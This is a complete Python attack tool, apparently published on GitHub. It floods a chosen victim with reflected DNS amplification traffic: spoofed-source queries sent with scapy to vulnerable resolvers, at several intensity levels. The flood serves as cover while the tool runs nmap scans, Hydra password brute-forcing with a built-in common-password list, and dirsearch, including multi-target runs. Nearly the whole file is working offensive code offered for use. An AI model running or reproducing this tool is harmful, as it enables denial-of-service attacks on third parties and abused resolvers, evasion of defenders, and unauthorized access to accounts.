#!/usr/bin/env python3

import json
import random
import threading
import time
import subprocess
import sys
import argparse
import signal
import logging
import os
import shutil
import socket
import ipaddress
import re
from datetime import datetime
from urllib.parse import urlparse
from scapy.all import *

LOGO = r"""

• ▌ ▄ ·.  ▄▄▄· .▄▄ · .▄▄▄  ▄• ▄▌▄▄▄ .▄▄▄   ▄▄▄· ·▄▄▄▄  ▄▄▄ .
·██ ▐███▪▐█ ▀█ ▐█ ▀. ▐▀•▀█ █▪██▌▀▄.▀·▀▄ █·▐█ ▀█ ██▪ ██ ▀▄.▀·
▐█ ▌▐▌▐█·▄█▀▀█ ▄▀▀▀█▄█▌·.█▌█▌▐█▌▐▀▀▪▄▐▀▀▄ ▄█▀▀█ ▐█· ▐█▌▐▀▀▪▄
██ ██▌▐█▌▐█ ▪▐▌▐█▄▪▐█▐█▪▄█·▐█▄█▌▐█▄▄▌▐█•█▌▐█ ▪▐▌██. ██ ▐█▄▄▌
▀▀  █▪▀▀▀ ▀  ▀  ▀▀▀▀ ·▀▀█.  ▀▀▀  ▀▀▀ .▀  ▀ ▀  ▀ ▀▀▀▀▀•  ▀▀▀ 

BY KL3FT3Z  https://github.com/toxy4ny


             .,ad88888ba,.
         .,ad8888888888888a,
        d8P'''98888P'''98888b,
        9b    d8888,    `9888B
      ,d88aaa8888888b,,,d888P'
     d8888888888888888888888b
    d888888P""98888888888888P
    88888P'    9888888888888
    `98P'       9888888888P'
                 `"9888P"'
                    `"'
"""

def banner():

    os.system("cls" if os.name == "nt" else "clear")
    print(LOGO)
    print("The masquerade a shadow web security scanner using DNS amplification.\n")



logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('masker.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class DNSAmplificationMasker:
    def __init__(self, dns_report_file):
        self.dns_servers = []
        self.load_vulnerable_dns_servers(dns_report_file)
        
        self.masking_active = False
        self.attack_threads = []
        
        self.packets_sent = 0
        self.amplification_volume = 0
        self.start_time = None
        
        self.amplification_config = {
            'light': {'threads': 3, 'rate': 10, 'burst_size': 5},
            'medium': {'threads': 5, 'rate': 50, 'burst_size': 10},
            'heavy': {'threads': 8, 'rate': 100, 'burst_size': 20},
            'extreme': {'threads': 12, 'rate': 200, 'burst_size': 30}
        }
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def load_vulnerable_dns_servers(self, report_file):
        
        try:
            with open(report_file, 'r') as f:
                report = json.load(f)
            
            vulnerable_servers = report.get('vulnerable_servers', [])
            
            for server in vulnerable_servers:
                self.dns_servers.append({
                    'ip': server['server'],
                    'amplification': server['amplification'],
                    'query_type': server['query_type'],
                    'domain': server['domain'],
                    'response_size': server['response_size']
                })
            
            self.dns_servers.sort(key=lambda x: x['amplification'], reverse=True)
            
            logger.info(f"✅ Loading {len(self.dns_servers)} victim DNS servers")
            logger.info(f"🎯 Top Server: {self.dns_servers[0]['ip']} (x{self.dns_servers[0]['amplification']})")
            
        except FileNotFoundError:
            logger.error(f"❌ File {report_file} not found!")
            sys.exit(1)
        except json.JSONDecodeError:
            logger.error(f"❌ Error parsing of JSON file {report_file}")
            sys.exit(1)
        except KeyError as e:
            logger.error(f"❌ Incorrect report format: missing key {e}")
            sys.exit(1)

    def signal_handler(self, signum, frame):
       
        logger.info("🛑 A completion signal has been received, and we are stopping the disguise...")
        self.stop_masking()
        sys.exit(0)

    def create_amplified_packet(self, target_ip, dns_server):
        
        try:
            
            query_type = dns_server['query_type']
            domain = dns_server['domain']
            
            
            qtype_map = {
                'ANY': 255,
                'TXT': 16,
                'MX': 15,
                'NS': 2,
                'A': 1
            }
            
            qtype_num = qtype_map.get(query_type, 255)  
            
            
            packet = IP(
                src=target_ip,
                dst=dns_server['ip']
            ) / UDP(
                sport=random.randint(1024, 65535),
                dport=53
            ) / DNS(
                id=random.randint(1, 65535),
                qr=0, 
                rd=1,  
                qd=DNSQR(qname=domain, qtype=qtype_num)
            )
            
            return packet
            
        except Exception as e:
            logger.error(f"Packet creation error: {e}")
            return None

    def amplification_worker(self, target_ip, intensity='medium', duration=300):
        
        config = self.amplification_config[intensity]
        end_time = time.time() + duration
        
        packets_sent_local = 0
        
        logger.info(f"🚀 Starting an amplification worker: {intensity} Rate, {duration}с")
        
        while time.time() < end_time and self.masking_active:
            try:
               
                for _ in range(config['burst_size']):
                    if not self.masking_active:
                        break
                        
                   
                    dns_server = self.weighted_dns_choice()
                    
                    
                    packet = self.create_amplified_packet(target_ip, dns_server)
                    if packet:
                        send(packet, verbose=0)
                        packets_sent_local += 1
                        self.packets_sent += 1
                        
                        
                        estimated_response = dns_server['response_size']
                        self.amplification_volume += estimated_response
                
               
                time.sleep(60 / config['rate'])  
                
            except Exception as e:
                logger.error(f"Error in amplification worker: {e}")
                time.sleep(1)
        
        logger.info(f"🏁 The worker has completed its work. Packets sent: {packets_sent_local}")

    def weighted_dns_choice(self):
        
        top_servers = self.dns_servers[:max(1, len(self.dns_servers) // 5)]
        
        weights = [server['amplification'] for server in top_servers]
        
        return random.choices(top_servers, weights=weights)[0]

    def start_masking(self, target_ip, intensity='medium', duration=300):
        
        if self.masking_active:
            logger.warning("⚠️ Masquerade is already active!")
            return
        
        logger.info(f"🎭 We are starting DNS amplification masking")
        logger.info(f"🎯 Victim: {target_ip}")
        logger.info(f"⚡ Rate: {intensity}")
        logger.info(f"⏱️ Time: {duration} seconds")
        logger.info(f"🔧 DNS servers: {len(self.dns_servers)}")
        
        self.masking_active = True
        self.start_time = time.time()
        self.packets_sent = 0
        self.amplification_volume = 0
        
        config = self.amplification_config[intensity]
        
        for i in range(config['threads']):
            thread = threading.Thread(
                target=self.amplification_worker,
                args=(target_ip, intensity, duration),
                name=f"AmplificationWorker-{i+1}"
            )
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
        
        stats_thread = threading.Thread(
            target=self.stats_monitor,
            args=(duration,),
            name="StatsMonitor"
        )
        stats_thread.daemon = True
        stats_thread.start()
        self.attack_threads.append(stats_thread)

    def stats_monitor(self, duration):
       
        start_time = time.time()
        
        while self.masking_active and (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            
            if elapsed > 0:
                pps = self.packets_sent / elapsed  
                volume_mbps = (self.amplification_volume * 8) / (1024 * 1024 * elapsed)  # Mbps
                
                logger.info(f"📊 Statistic: {self.packets_sent} packets, "
                           f"{pps:.1f} pps, ~{volume_mbps:.1f} Mbps amplification")
            
            time.sleep(30)  

    def stop_masking(self):
       
        if not self.masking_active:
            return
        
        logger.info("🛑 We stop the masquerade...")
        self.masking_active = False
        
        for thread in self.attack_threads:
            if thread.is_alive():
                thread.join(timeout=5)
        
        if self.start_time:
            total_time = time.time() - self.start_time
            avg_pps = self.packets_sent / max(total_time, 1)
            total_volume_mb = self.amplification_volume / (1024 * 1024)
            
            logger.info(f" 📈 Final statistics:")
            logger.info(f"  ⏱️ Working hours: {total_time:.1f} seconds)")
            logger.info(f"  📦 Packets sent: {self.packets_sent}")
            logger.info(f"  📊 Average PPS: {avg_pps:.1f}")
            logger.info(f"  💥 Estimated amplification: {total_volume_mb:.1f} MB")
        
        self.attack_threads.clear()
        logger.info("✅ The masquerade has been stopped")

    def masked_nmap_scan(self, target, nmap_args="", scan_delay=0, masking_intensity='medium'):
        
        target_ips = self.parse_target(target)
        if not target_ips:
            logger.error(f"❌ Couldn't determine the IP addresses for the target: {target}")
            return False
        
        logger.info(f"🔍 Starting a masked nmap scan")
        logger.info(f"🎯 Victim: {target} ({len(target_ips)} IP address)")
        
        masking_duration = 600  
        
        for target_ip in target_ips[:3]: 
            masking_thread = threading.Thread(
                target=self.start_background_masking,
                args=(target_ip, masking_intensity, masking_duration)
            )
            masking_thread.daemon = True
            masking_thread.start()
        
        time.sleep(10)  
        
        nmap_cmd = self.prepare_nmap_command(target, nmap_args, scan_delay)
        
        logger.info(f"🚀 Launching nmap: {' '.join(nmap_cmd)}")
        
        try:
 
            process = subprocess.Popen(
                nmap_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            
            for line in process.stdout:
                print(line.rstrip())
            
            process.wait()
            
            if process.returncode == 0:
                logger.info("✅ Nmap scan completed successfully")
                return True
            else:
                stderr_output = process.stderr.read()
                logger.error(f"❌ Nmap failed with an error: {stderr_output}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error when starting nmap: {e}")
            return False
        finally:
           
            time.sleep(5)  
            self.stop_masking()

    def masked_hydra_attack(self, target, service, userlist=None, passlist=None, 
                           hydra_args="", masking_intensity='heavy'):
        
        target_ips = self.parse_target(target)
        if not target_ips:
            logger.error(f"❌ Couldn't determine the IP address for the target: {target}")
            return False
        
        main_target_ip = target_ips[0]
        
        logger.info(f"⚔️ Launching a disguised Hydra attack")
        logger.info(f"🎯 Victim: {target} ({main_target_ip})")
        logger.info(f"🔧 Service: {service}")
         
        masking_duration = 3600  
         
        masking_thread = threading.Thread(
            target=self.start_background_masking,
            args=(main_target_ip, masking_intensity, masking_duration)
        )
        masking_thread.daemon = True
        masking_thread.start()
        
        time.sleep(15)  
        
        hydra_cmd = self.prepare_hydra_command(target, service, userlist, passlist, hydra_args)
        
        logger.info(f"🔓 Launching Hydra: {' '.join(hydra_cmd)}")
        
        try:
            process = subprocess.Popen(
                hydra_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            for line in process.stdout:
                print(line.rstrip())
                
                if "[22][ssh]" in line or "login:" in line:
                    logger.info("🎉 A valid password has been found! We strengthen the disguise...")
                    self.boost_masking(main_target_ip)
            
            process.wait()
            
            if process.returncode == 0:
                logger.info("✅ Hydra attack is completed")
                return True
            else:
                stderr_output = process.stderr.read()  
                logger.error(f"❌ Hydra failed with an error: {stderr_output}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error when launching Hydra: {e}")
            return False
        finally:
            time.sleep(10)
            self.stop_masking()

    def masked_dirsearch(self, target_url, wordlist=None, extensions=None, 
                        dirsearch_args="", masking_intensity='medium'):
       
        target_domain = self.extract_domain_from_url(target_url)
        target_ips = self.parse_target(target_domain)
        
        if not target_ips:
            logger.error(f"❌ Couldn't determine the IP for the URL: {target_url}")
            return False
        
        main_target_ip = target_ips[0]
        
        logger.info(f"🔍 Starting a masked dirsearch scan")
        logger.info(f"🎯 URL: {target_url} ({main_target_ip})")
        logger.info(f"📁 Search for directories and files")
        
        masking_duration = 1800
        
        masking_thread = threading.Thread(
            target=self.start_background_masking,
            args=(main_target_ip, masking_intensity, masking_duration)
        )
        masking_thread.daemon = True
        masking_thread.start()
        
        time.sleep(10)  
        
        dirsearch_cmd = self.prepare_dirsearch_command(
            target_url, wordlist, extensions, dirsearch_args
        )
        
        logger.info(f"📂 Launching dirsearch: {' '.join(dirsearch_cmd)}")
        
        try:
            process = subprocess.Popen(
                dirsearch_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            found_items = []
            
            for line in process.stdout:
                print(line.rstrip())
                
                if self.is_dirsearch_hit(line):
                    found_items.append(line.strip())
                    logger.info(f"🎉 A resource has been found! We strengthen the disguise...")
                    
                    self.boost_masking_for_dirsearch(main_target_ip)
            
            process.wait()
            
            if found_items:
                logger.info(f"📊 Resources found: {len(found_items)}")
                self.save_dirsearch_results(target_url, found_items)
            
            if process.returncode == 0:
                logger.info("✅ Dirsearch scan completed successfully")
                return True
            else:
                stderr_output = process.stderr.read()
                logger.error(f"❌ Dirsearch failed with an error: {stderr_output}")
                return False
                
        except Exception as e:
            logger.error(f"❌ Error when starting dirsearch: {e}")
            return False
        finally:
            time.sleep(10)
            self.stop_masking()

    def masked_comprehensive_web_scan(self, target_url, masking_intensity='heavy'):
        
        target_domain = self.extract_domain_from_url(target_url)
        target_ips = self.parse_target(target_domain)
        
        if not target_ips:
            logger.error(f"❌ Couldn't determine the IP for the URL: {target_url}")
            return False
        
        main_target_ip = target_ips[0]
        
        logger.info("🎯 We are starting a all vectors web scan under disguise")
        logger.info(f"🌐 Цель: {target_url} ({main_target_ip})")
        
        total_duration = 3600
        
        masking_thread = threading.Thread(
            target=self.start_background_masking,
            args=(main_target_ip, masking_intensity, total_duration)
        )
        masking_thread.daemon = True
        masking_thread.start()
        
        time.sleep(15)
        
        results = {
            'nmap': False,
            'dirsearch': False,
            'hydra': False
        }
        
        try:
            
            logger.info("🔍 Phase 1: Nmap port scanning...")
            nmap_success = self.masked_nmap_scan(
                target=target_domain,
                nmap_args="-p 80,443,8080,8443 -sV --script=http-title,http-server-header",
                masking_intensity='light'  
            )
            results['nmap'] = nmap_success
            
            time.sleep(60)  
            
            logger.info("📁 Phase 2: Dirsearch directory search...")
            dirsearch_success = self.masked_dirsearch(
                target_url=target_url,
                extensions="php,html,js,txt,zip,bak",
                masking_intensity='light' 
            )
            results['dirsearch'] = dirsearch_success
            
            time.sleep(120)  
            
            logger.info("⚔️ Phase 3: HTTP authentication brute force...")
            
            auth_vectors = [
                {'service': 'http-get', 'args': '"/admin"'},
                {'service': 'http-post-form', 'args': '"/login:user=^USER^&pass=^PASS^:Invalid"'},
                {'service': 'https-get', 'args': '"/admin"'}
            ]
            
            for vector in auth_vectors:
                logger.info(f"🔐 Testing {vector['service']}...")
                
                hydra_success = self.masked_hydra_attack(
                    target=target_url,
                    service=vector['service'],
                    hydra_args=vector.get('args', ''),
                    masking_intensity='light' 
                )
                
                if hydra_success:
                    results['hydra'] = True
                    break
                
                time.sleep(180)
            
            successful_phases = sum(results.values())
            logger.info(f"📊 Comprehensive scan results:")
            logger.info(f"  ✅ Successful phases: {successful_phases}/3")
            logger.info(f"  🔍 Nmap: {'✅' if results['nmap'] else '❌'}")
            logger.info(f"  📁 Dirsearch: {'✅' if results['dirsearch'] else '❌'}")
            logger.info(f"  ⚔️  Hydra: {'✅' if results['hydra'] else '❌'}")
            
            return successful_phases > 0
            
        except Exception as e:
            logger.error(f"❌ Error in complex scanning: {e}")
            return False
        finally:
            self.stop_masking()

    def masked_multi_target_dirsearch(self, target_file, extensions=None, 
                                     masking_intensity='heavy'):
        
        if not os.path.exists(target_file):
            logger.error(f"❌ The file with the goals was not found: {target_file}")
            return False
        
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        logger.info(f"🎯 Loading {len(targets)} victim for scanning")
        
        all_results = {}
        
        for i, target in enumerate(targets, 1):
            logger.info(f"🔍 Scanning Victim {i}/{len(targets)}: {target}")
            
            try:
                success = self.masked_dirsearch(
                    target_url=target,
                    extensions=extensions,
                    masking_intensity=masking_intensity
                )
                
                all_results[target] = success
                
                if i < len(targets):  
                    pause_time = random.randint(300, 600)
                    logger.info(f"⏸️ Pause {pause_time} seconds before the next target...")
                    time.sleep(pause_time)
                
            except Exception as e:
                logger.error(f"❌ Scan error {target}: {e}")
                all_results[target] = False
        
        successful = sum(all_results.values())
        logger.info(f"📊 Multi-purpose scanning completed:")
        logger.info(f"✅ Successfully: {successful}/{len(targets)}")
        
        return successful > 0

    def start_background_masking(self, target_ip, intensity, duration):

        self.start_masking(target_ip, intensity, duration)
        
        time.sleep(duration)
        self.stop_masking()

    def boost_masking(self, target_ip):
        
        logger.info("🚀 We are launching an additional disguise...")
        
        boost_thread = threading.Thread(
            target=self.start_background_masking,
            args=(target_ip, 'extreme', 300)  
        )
        boost_thread.daemon = True
        boost_thread.start()

    def boost_masking_for_dirsearch(self, target_ip):
        
        boost_thread = threading.Thread(
            target=self.amplification_burst,
            args=(target_ip, 30, 'heavy') 
        )
        boost_thread.daemon = True
        boost_thread.start()

    def amplification_burst(self, target_ip, duration, intensity):
        
        config = self.amplification_config[intensity]
        end_time = time.time() + duration
        
        while time.time() < end_time:
           
            for _ in range(config['burst_size'] * 2):  
                dns_server = self.weighted_dns_choice()
                packet = self.create_amplified_packet(target_ip, dns_server)
                
                if packet:
                    send(packet, verbose=0)
                    self.packets_sent += 1
            
            time.sleep(0.1)  

    def parse_target(self, target):
       
        target_ips = []
        
        try:
           
            if '/' in target:
               
                network = ipaddress.IPv4Network(target, strict=False)
                target_ips = [str(ip) for ip in list(network.hosts())[:10]]  
            else:
                try:
                    
                    ip = ipaddress.IPv4Address(target)
                    target_ips = [str(ip)]
                except:
                  
                    ip = socket.gethostbyname(target) 
                    target_ips = [ip]
                    
        except Exception as e:
            logger.error(f"Parsing error {target}: {e}")
        
        return target_ips

    def extract_domain_from_url(self, url):
       
        try:
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
                
            parsed = urlparse(url)
            return parsed.hostname or parsed.netloc.split(':')[0]
            
        except Exception as e:
            logger.error(f"URL parsing error{url}: {e}")
            return url.split('/')[0] 

    def prepare_nmap_command(self, target, nmap_args, scan_delay):
        
        cmd = ['nmap']
        
        if nmap_args:
            cmd.extend(nmap_args.split())
        
        
        if not any(arg in nmap_args for arg in ['-T', '--timing']):
            cmd.extend(['-T2']) 
            
        if not any(arg in nmap_args for arg in ['-sS', '-sT', '-sU']):
            cmd.extend(['-sS'])  
            
       
        if scan_delay > 0:
            cmd.extend(['--scan-delay', f'{scan_delay}ms'])
        else:
            cmd.extend(['--scan-delay', '100ms'])  
            
        cmd.append(target)
        
        return cmd

    def prepare_hydra_command(self, target, service, userlist, passlist, hydra_args):
        
        cmd = ['hydra']
        
        if userlist:
            cmd.extend(['-L', userlist])
        else:
            cmd.extend(['-l', 'admin']) 
            
        if passlist:
            cmd.extend(['-P', passlist])
        else:
           
            temp_passfile = self.create_temp_passlist()
            cmd.extend(['-P', temp_passfile])
        
        cmd.extend([
            '-t', '1',     
            '-W', '30',      
            '-f',           
            '-v'           
        ])
        
        if hydra_args:
            cmd.extend(hydra_args.split())
        
        cmd.extend([target, service])
        
        return cmd

    def prepare_dirsearch_command(self, target_url, wordlist, extensions, dirsearch_args):
       
        cmd = ['dirsearch']
        
        cmd.extend(['-u', target_url])
        
        if wordlist and os.path.exists(wordlist):
            cmd.extend(['-w', wordlist])
        else:
            
            default_wordlists = [
                '/usr/share/dirsearch/db/dicc.txt',
                '/opt/dirsearch/db/dicc.txt',
                './db/dicc.txt'  
            ]
            
            for wl in default_wordlists:
                if os.path.exists(wl):
                    cmd.extend(['-w', wl])
                    break
    
        if extensions:
            cmd.extend(['-e', extensions])
        else:
            cmd.extend(['-e', 'php,html,js,txt,xml,json'])
        
        cmd.extend([
            '--delay', '2',          
            '--timeout', '10',        
            '--max-rate', '10',      
            '--threads', '5',         
            '--exclude-status', '404,400,403,500,502,503',  
        ])
        
        cmd.extend([
            '--random-user-agents',   
            '--force-extensions',    
            '--remove-extensions',    
        ])
        
        if dirsearch_args:
            cmd.extend(dirsearch_args.split())
        
        return cmd

    def create_temp_passlist(self):

        common_passwords = [
            'password', '123456', 'admin', 'root', 'toor',
            'password123', 'admin123', '123456789', 'qwerty',
            'abc123', 'Password1', 'welcome', 'login', 'guest'
        ]
        
        temp_file = '/tmp/temp_passwords.txt' 
        with open(temp_file, 'w') as f:
            for pwd in common_passwords:
                f.write(pwd + '\n')
        
        return temp_file

    def is_dirsearch_hit(self, line):
        
        success_patterns = [
            r'\s+200\s+',     # HTTP 200
            r'\s+301\s+',     # HTTP 301 (redirect)
            r'\s+302\s+',     # HTTP 302 (redirect)
            r'\s+401\s+',     # HTTP 401 (auth required - интересно!)
            r'\s+403\s+',     # HTTP 403 (forbidden - тоже интересно!)
        ]
        
        exclude_patterns = [
            r'ERROR',
            r'FAILED',
            r'Target',
            r'Extensions:',
            r'Wordlist:',
            r'Starting'
        ]
        
        for exclude in exclude_patterns:
            if exclude in line:
                return False
        
        for pattern in success_patterns:
            if re.search(pattern, line):
                return True
        
        return False

    def save_dirsearch_results(self, target_url, found_items):
       
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        domain = self.extract_domain_from_url(target_url).replace('.', '_')
        
        filename = f"dirsearch_{domain}_{timestamp}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write(f"Dirsearch results for: {target_url}\n")
                f.write(f"Scan time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*60 + "\n\n")
                
                for item in found_items:
                    f.write(item + "\n")
            
            logger.info(f"💾 The results are saved in: {filename}")
            
        except Exception as e:
            logger.error(f"Error saving results: {e}")

def main():
    banner ()
    parser = argparse.ArgumentParser(
        description="The masquerade a shadow web security scanner using DNS amplification.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
🎭 Usage examples:

# Masked nmap scanning  
python3 masker.py --dns-report dns_amplification_report.json nmap \\
    --target 192.168.1.1 --args "-p 1-1000 -sV"

# Masked SSH brute force
python3 masker.py --dns-report dns_amplification_report.json hydra \\
    --target ssh://192.168.1.1 --service ssh --userlist users.txt

# Masked dirsearch
python3 masker.py --dns-report dns_amplification_report.json dirsearch \\
    --url https://example.com --extensions "php,html,js"

# Comprehensive web scanning (nmap + dirsearch + hydra)
python3 masker.py --dns-report dns_amplification_report.json webscan \\
    --url https://example.com --intensity heavy

# Multiple dirsearch
python3 masker.py --dns-report dns_amplification_report.json multidirsearch \\
    --targets urls.txt --intensity extreme

# DNS amplification (testing) only
python3 masker.py --dns-report dns_amplification_report.json amplify \\
    --target 192.168.1.1 --intensity heavy --duration 300
        """
    )
    
    parser.add_argument('--dns-report', required=True,
                       help='A report file with vulnerable DNS servers (from vacuum.py )')
    
    subparsers = parser.add_subparsers(dest='action', help='Action to perform')
    
    nmap_parser = subparsers.add_parser('nmap', help='Masked nmap scanning')
    nmap_parser.add_argument('--target', required=True, help='The Victim of the scan')
    nmap_parser.add_argument('--args', default='', help='Arguments for nmap')
    nmap_parser.add_argument('--scan-delay', type=int, default=100, help='Delay between packets (ms)')
    nmap_parser.add_argument('--intensity', choices=['light', 'medium', 'heavy', 'extreme'], 
                            default='medium', help='Masking intensity')
    
    hydra_parser = subparsers.add_parser('hydra', help='Masked Hydra brute Force')
    hydra_parser.add_argument('--target', required=True, help='The Victim of the scan')
    hydra_parser.add_argument('--service', required=True, help='Service (ssh, ftp, http-get, etc.)')
    hydra_parser.add_argument('--userlist', help='The file with the list of users')
    hydra_parser.add_argument('--passlist', help='A file with a list of passwords')
    hydra_parser.add_argument('--args', default='', help='Additional arguments for hydra')
    hydra_parser.add_argument('--intensity', choices=['light', 'medium', 'heavy', 'extreme'],
                             default='heavy', help='Masking intensity')
    
    dirsearch_parser = subparsers.add_parser('dirsearch', help='Masked dirsearch directory search')
    dirsearch_parser.add_argument('--url', required=True, help='The Victim of the scan')
    dirsearch_parser.add_argument('--wordlist', help='Wordlist for dirsearch')
    dirsearch_parser.add_argument('--extensions', default='php,html,js,txt', 
                                 help='File extensions for search')
    dirsearch_parser.add_argument('--args', default='', help='Additional arguments for dirsearch')
    dirsearch_parser.add_argument('--intensity', choices=['light', 'medium', 'heavy', 'extreme'],
                                 default='medium', help='Masking intensity')
    
    webscan_parser = subparsers.add_parser('webscan', help='Comprehensive web scanning (nmap+dirsearch+hydra)')
    webscan_parser.add_argument('--url', required=True, help='The Victim of the scan')
    webscan_parser.add_argument('--intensity', choices=['light', 'medium', 'heavy', 'extreme'],
                               default='heavy', help='Masking intensity')
    
    multidirsearch_parser = subparsers.add_parser('multidirsearch', help='Dirsearch for multiple victims')
    multidirsearch_parser.add_argument('--targets', required=True, help='A file with a list of goal URLs')
    multidirsearch_parser.add_argument('--extensions', default='php,html,js,txt',
                                      help='File extensions for search')
    multidirsearch_parser.add_argument('--intensity', choices=['light', 'medium', 'heavy', 'extreme'],
                                      default='heavy', help='Masking intensity')
    
    amplify_parser = subparsers.add_parser('amplify', help='DNS amplification (testing) only')
    amplify_parser.add_argument('--target', required=True, help='The Victim of the scan')
    amplify_parser.add_argument('--intensity', choices=['light', 'medium', 'heavy', 'extreme'],
                               default='medium', help='Intensity of amplification')
    amplify_parser.add_argument('--duration', type=int, default=300, help='Duration in seconds')
    
    args = parser.parse_args()
    
    if not args.action:
        parser.print_help()
        return
    
    if os.geteuid() != 0:
        logger.warning("⚠️ It is not running with root rights. Some functions may not work.")
    
    required_tools = {
        'nmap': ['nmap', 'hydra', 'amplify', 'webscan'],
        'hydra': ['hydra', 'webscan'],
        'dirsearch': ['dirsearch', 'webscan', 'multidirsearch']
    }
    
    for tool, actions in required_tools.items():
        if args.action in actions and not shutil.which(tool):
            logger.error(f"❌ {tool} not installed! Setup its to work in the mode {args.action}")
            sys.exit(1)
    
    masker = DNSAmplificationMasker(args.dns_report)
    
    try:
        if args.action == 'nmap':
            success = masker.masked_nmap_scan(
                target=args.target,
                nmap_args=args.args,
                scan_delay=args.scan_delay,
                masking_intensity=args.intensity
            )
            sys.exit(0 if success else 1)
            
        elif args.action == 'hydra':
            success = masker.masked_hydra_attack(
                target=args.target,
                service=args.service,
                userlist=args.userlist,
                passlist=args.passlist,
                hydra_args=args.args,
                masking_intensity=args.intensity
            )
            sys.exit(0 if success else 1)
            
        elif args.action == 'dirsearch':
            success = masker.masked_dirsearch(
                target_url=args.url,
                wordlist=args.wordlist,
                extensions=args.extensions,
                dirsearch_args=args.args,
                masking_intensity=args.intensity
            )
            sys.exit(0 if success else 1)
            
        elif args.action == 'webscan':
            success = masker.masked_comprehensive_web_scan(
                target_url=args.url,
                masking_intensity=args.intensity
            )
            sys.exit(0 if success else 1)
            
        elif args.action == 'multidirsearch':
            success = masker.masked_multi_target_dirsearch(
                target_file=args.targets,
                extensions=args.extensions,
                masking_intensity=args.intensity
            )
            sys.exit(0 if success else 1)
            
        elif args.action == 'amplify':
            masker.start_masking(
                target_ip=args.target,
                intensity=args.intensity,
                duration=args.duration
            )
            
            time.sleep(args.duration)
            masker.stop_masking()
            
    except KeyboardInterrupt:
        logger.info("🛑 Interrupted by the user")
        masker.stop_masking()
        sys.exit(0)
    except Exception as e:
        logger.error(f"❌ Critical error: {e}")
        masker.stop_masking()
        sys.exit(1)

if __name__ == "__main__":
    main()
